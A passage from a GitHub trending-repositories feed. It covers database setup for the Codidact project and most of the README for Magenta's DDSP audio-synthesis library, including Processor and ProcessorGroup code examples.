&lt;h4&gt;&lt;a id="user-content-database-setup" class="anchor" aria-hidden="true" href="#database-setup"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Database Setup&lt;/h4&gt;
&lt;p&gt;These instructions assume that you don't have a PostgreSQL DB server installed at the moment
and would like to run one locally. These instructions may change heavily depending on your circumstances.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Install PostgreSQL:
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.enterprisedb.com/downloads/postgres-postgresql-downloads" rel="nofollow"&gt;Windows&lt;/a&gt;. This will also install pgAdmin.&lt;/li&gt;
&lt;li&gt;Linux users will most likely want to use the PostgreSQL version provided by their package manager.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Create a new database and name it whatever you like. Windows users can do this using pgAdmin.&lt;/li&gt;
&lt;li&gt;Open &lt;code&gt;appsettings.Development.json&lt;/code&gt; in the WebUI project and add a new connection string for your database. It will look
something like this, along with any relevant connection information:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;"ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=YOUR_DATABASE;"
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start="4"&gt;
&lt;li&gt;Open a terminal at the Codidact solution folder. Run the command &lt;code&gt;dotnet tool install --global dotnet-ef&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Navigate to the WebUI project folder and un &lt;code&gt;dotnet ef database update&lt;/code&gt; to apply the project migrations to the database.&lt;/li&gt;
&lt;li&gt;Verify that your database is now populated with new tables.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/codidact/core/blob/develop/LICENSE"&gt;AGPL v3.0&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributions" class="anchor" aria-hidden="true" href="#contributions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributions&lt;/h2&gt;
&lt;p&gt;Very welcome! Please read our &lt;a href="https://github.com/codidact/core/blob/develop/CONTRIBUTING.md"&gt;contributing guidelines&lt;/a&gt; before
you start writing code.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>codidact</author><guid isPermaLink="false">https://github.com/codidact/core</guid><pubDate>Sun, 19 Jan 2020 00:14:00 GMT</pubDate></item><item><title>magenta/ddsp #15 in All Languages, Today</title><link>https://github.com/magenta/ddsp</link><description>&lt;p&gt;&lt;i&gt; DDSP: Differentiable Digital Signal Processing&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;div align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/e89c7e0ea242457219536aec4835c66f6d0819b9/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f646473705f6c6f676f2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/e89c7e0ea242457219536aec4835c66f6d0819b9/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f646473705f6c6f676f2e706e67" width="200px" alt="logo" data-canonical-src="https://storage.googleapis.com/ddsp/github_images/ddsp_logo.png" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h1&gt;&lt;a id="user-content-ddsp-differentiable-digital-signal-processing" class="anchor" aria-hidden="true" href="#ddsp-differentiable-digital-signal-processing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DDSP: Differentiable Digital Signal Processing&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/magenta/ddsp" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/0dabafd67f0390270526e5b32c14e82ca8f80e5a/68747470733a2f2f7472617669732d63692e6f72672f6d6167656e74612f646473702e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/magenta/ddsp.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="#Tutorials"&gt;&lt;strong&gt;Tutorials&lt;/strong&gt;&lt;/a&gt;
| &lt;a href="#Overview"&gt;&lt;strong&gt;Overview&lt;/strong&gt;&lt;/a&gt;
| &lt;a href="#Installation"&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DDSP is a library of differentiable versions of common DSP functions (such as
synthesizers, waveshapers, and filters). This allows these
interpretable elements to be used as part of an deep learning model, especially
as the output layers for audio generation.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-getting-started" class="anchor" aria-hidden="true" href="#getting-started"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting Started&lt;/h2&gt;
&lt;p&gt;First, follow the steps in the &lt;a href="#Installation"&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/a&gt; section
to install the DDSP package and its dependencies. DDSP modules can be used to
generate and manipulate audio from neural network outputs as in this simple example:&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; ddsp

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Get synthesizer parameters from a neural network.&lt;/span&gt;
outputs &lt;span class="pl-k"&gt;=&lt;/span&gt; network(inputs)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Initialize signal processors.&lt;/span&gt;
additive &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.synths.Additive()

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Generates audio from additive synthesizer.&lt;/span&gt;
audio &lt;span class="pl-k"&gt;=&lt;/span&gt; additive(outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;amplitudes&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;],
                 outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;harmonic_distribution&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;],
                 outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;f0_hz&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;])&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/abs/2001.04643" rel="nofollow"&gt;Read the original paper &lt;g-emoji class="g-emoji" alias="page_facing_up" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c4.png"&gt;📄&lt;/g-emoji&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://goo.gl/magenta/ddsp-examples" rel="nofollow"&gt;Listen to some examples &lt;g-emoji class="g-emoji" alias="speaker" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f508.png"&gt;🔈&lt;/g-emoji&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/demos/timbre_transfer.ipynb"&gt;Try out the timbre transfer demo &lt;g-emoji class="g-emoji" alias="microphone" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3a4.png"&gt;🎤&lt;/g-emoji&gt;-&amp;gt;&lt;g-emoji class="g-emoji" alias="violin" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3bb.png"&gt;🎻&lt;/g-emoji&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id="user-content-tutorials"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-tutorials" class="anchor" aria-hidden="true" href="#tutorials"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tutorials&lt;/h3&gt;
&lt;p&gt;The best place to start is the step-by-step tutorials for all the major library components that can be found in
&lt;a href="./ddsp/colabs/tutorials"&gt;&lt;code&gt;colabs/tutorials&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/tutorials/0_processor.ipynb"&gt;0_processor&lt;/a&gt;:
Introduction to the Processor class.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/tutorials/1_synths_and_effects.ipynb"&gt;1_synths_and_effects&lt;/a&gt;:
Example usage of processors.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/tutorials/2_processor_group.ipynb"&gt;2_processor_group&lt;/a&gt;:
Stringing processors together in a ProcessorGroup.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/tutorials/3_training.ipynb"&gt;3_training&lt;/a&gt;:
Example of training on a single sound.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/colab/tutorials/3_training.ipynb"&gt;4_core_functions&lt;/a&gt;:
Extensive examples for most of the core DDSP functions.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-modules" class="anchor" aria-hidden="true" href="#modules"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Modules&lt;/h3&gt;
&lt;p&gt;The DDSP library code is separated into several modules:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="./ddsp/core.py"&gt;Core&lt;/a&gt;:
All the core differentiable DSP functions.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/processors.py"&gt;Processors&lt;/a&gt;:
Base classes for Processor and ProcessorGroup.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/synths.py"&gt;Synths&lt;/a&gt;:
Processors that generate audio from network outputs.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/effects.py"&gt;Effects&lt;/a&gt;:
Processors that transorm audio according to network outputs.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/losses.py"&gt;Losses&lt;/a&gt;:
Loss functions relevant to DDSP applications.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/spectral_ops.py"&gt;Spectral Ops&lt;/a&gt;:
Helper library of Fourier and related transforms.&lt;/li&gt;
&lt;li&gt;&lt;a href="./ddsp/pretrained_models.py"&gt;Pretrained Models&lt;/a&gt;:
Helper library of models for perceptual loss functions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id="user-content-overview"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-overview" class="anchor" aria-hidden="true" href="#overview"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Overview&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-processor" class="anchor" aria-hidden="true" href="#processor"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Processor&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;Processor&lt;/code&gt; is the main object type and preferred API of the DDSP library. It inherits from &lt;code&gt;tfkl.Layer&lt;/code&gt; and can be used like any other differentiable module.&lt;/p&gt;
&lt;p&gt;Unlike other layers, Processors (such as Synthesizers and Effects) specifically format their &lt;code&gt;inputs&lt;/code&gt; into &lt;code&gt;controls&lt;/code&gt; that are physically meaningful.
For instance, a synthesizer might need to remove frequencies above the &lt;a href="https://en.wikipedia.org/wiki/Nyquist_frequency" rel="nofollow"&gt;Nyquist frquency&lt;/a&gt; to avoid &lt;a href="https://en.wikipedia.org/wiki/Aliasing" rel="nofollow"&gt;aliasing&lt;/a&gt; or ensure that its amplitudes are strictly positive. To this end, they have the methods:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;get_controls()&lt;/code&gt;: inputs -&amp;gt; controls.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;get_signal()&lt;/code&gt;: controls -&amp;gt; signal.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__call__()&lt;/code&gt;: inputs -&amp;gt; signal. (i.e. &lt;code&gt;get_signal(**get_controls())&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Where:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;inputs&lt;/code&gt; is a variable number of tensor arguments (depending on processor). Often the outputs of a neural network.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;controls&lt;/code&gt; is a dictionary of tensors scaled and constrained specifically for the processor.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;signal&lt;/code&gt; is an output tensor (usually audio or control signal for another processor).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For example, here are of some inputs to an &lt;code&gt;Additive()&lt;/code&gt; synthesizer:&lt;/p&gt;
&lt;div align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/85a5f2d02f5a161809f1c36644326913eef7f31a/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f6578616d706c655f696e707574732e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/85a5f2d02f5a161809f1c36644326913eef7f31a/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f6578616d706c655f696e707574732e706e67" width="800px" alt="logo" data-canonical-src="https://storage.googleapis.com/ddsp/github_images/example_inputs.png" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;p&gt;And here are the resulting controls after logarithmically scaling amplitudes, removing harmonics above the Nyquist frequency, and  normalizing the remaining harmonic distribution:&lt;/p&gt;
&lt;div align="center"&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/45c528c598b4ffe6fbe33398ff395933c2810b2c/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f6578616d706c655f636f6e74726f6c732e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/45c528c598b4ffe6fbe33398ff395933c2810b2c/68747470733a2f2f73746f726167652e676f6f676c65617069732e636f6d2f646473702f6769746875625f696d616765732f6578616d706c655f636f6e74726f6c732e706e67" width="800px" alt="logo" data-canonical-src="https://storage.googleapis.com/ddsp/github_images/example_controls.png" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;p&gt;Notice that only 18 harmonics are nonzero (sample rate 16kHz, Nyquist 8kHz, 18*440=7920Hz) and they sum to 1.0 at all times&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-processorgroup" class="anchor" aria-hidden="true" href="#processorgroup"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ProcessorGroup&lt;/h2&gt;
&lt;p&gt;Consider the situation where you want to string together a group of Processors.
Since Processors are just instances of &lt;code&gt;tfkl.Layer&lt;/code&gt; you could use python control flow,
as you would with any other differentiable modules.&lt;/p&gt;
&lt;p&gt;In the example below, we have an audio autoencoder that uses a
differentiable harmonic+noise synthesizer with reverb to generate audio for a multi-scale spectrogram reconstruction loss.&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; ddsp

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Get synthesizer parameters from the input audio.&lt;/span&gt;
outputs &lt;span class="pl-k"&gt;=&lt;/span&gt; network(audio_input)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Initialize signal processors.&lt;/span&gt;
additive &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.synths.Additive()
filtered_noise &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.synths.FilteredNoise()
reverb &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.effects.TrainableReverb()
spectral_loss &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.losses.SpectralLoss()

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Generate audio.&lt;/span&gt;
audio_additive &lt;span class="pl-k"&gt;=&lt;/span&gt; additive(outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;amplitudes&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;],
                          outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;harmonic_distribution&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;],
                          outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;f0_hz&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;])
audio_noise &lt;span class="pl-k"&gt;=&lt;/span&gt; filtered_noise(outputs[&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;magnitudes&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;])
audio &lt;span class="pl-k"&gt;=&lt;/span&gt; audio_additive &lt;span class="pl-k"&gt;+&lt;/span&gt; audio_noise
audio &lt;span class="pl-k"&gt;=&lt;/span&gt; reverb(audio)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Multi-scale spectrogram reconstruction loss.&lt;/span&gt;
loss &lt;span class="pl-k"&gt;=&lt;/span&gt; spectral_loss(audio, audio_input)&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-processorgroup-with-a-list" class="anchor" aria-hidden="true" href="#processorgroup-with-a-list"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ProcessorGroup (with a list)&lt;/h3&gt;
&lt;p&gt;A &lt;code&gt;ProcessorGroup&lt;/code&gt; allows specifies a as a Directed Acyclic Graph (DAG) of processors. The main advantage of using a ProcessorGroup is that the entire signal processing chain can be specified in a &lt;code&gt;.gin&lt;/code&gt; file, removing the need to write code in python for every different configuration of processors.&lt;/p&gt;
&lt;p&gt;You can specify the DAG as a list of tuples &lt;code&gt;dag = [(processor, ['input1', 'input2', ...]), ...]&lt;/code&gt; where &lt;code&gt;processor&lt;/code&gt; is an Processor instance, and &lt;code&gt;['input1', 'input2', ...]&lt;/code&gt; is a list of strings specifying input arguments. The output signal of each processor can be referenced as an input by the string &lt;code&gt;'processor_name/signal'&lt;/code&gt; where processor_name is the name of the processor at construction. The ProcessorGroup takes a dictionary of inputs, who keys can be referenced in the DAG.&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; ddsp
&lt;span class="pl-k"&gt;import&lt;/span&gt; gin

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Get synthesizer parameters from the input audio.&lt;/span&gt;
outputs &lt;span class="pl-k"&gt;=&lt;/span&gt; network(audio_input)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Initialize signal processors.&lt;/span&gt;
additive &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.synths.Additive()
filtered_noise &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.synths.FilteredNoise()
add &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.processors.Add()
reverb &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.effects.TrainableReverb()
spectral_loss &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.losses.SpectralLoss()

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Processor group DAG&lt;/span&gt;
dag &lt;span class="pl-k"&gt;=&lt;/span&gt; [
  (additive,
   [&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;amps&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;harmonic_distribution&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;f0_hz&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;]),
  (filtered_noise,
   [&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;magnitudes&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;]),
  (add,
   [&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;additive/signal&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;filtered_noise/signal&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;]),
  (reverb,
   [&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;add/signal&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;])
]
processor_group &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.processors.ProcessorGroup(&lt;span class="pl-v"&gt;dag&lt;/span&gt;&lt;span class="pl-k"&gt;=&lt;/span&gt;dag)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Generate audio.&lt;/span&gt;
audio &lt;span class="pl-k"&gt;=&lt;/span&gt; processor_group(outputs)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Multi-scale spectrogram reconstruction loss.&lt;/span&gt;
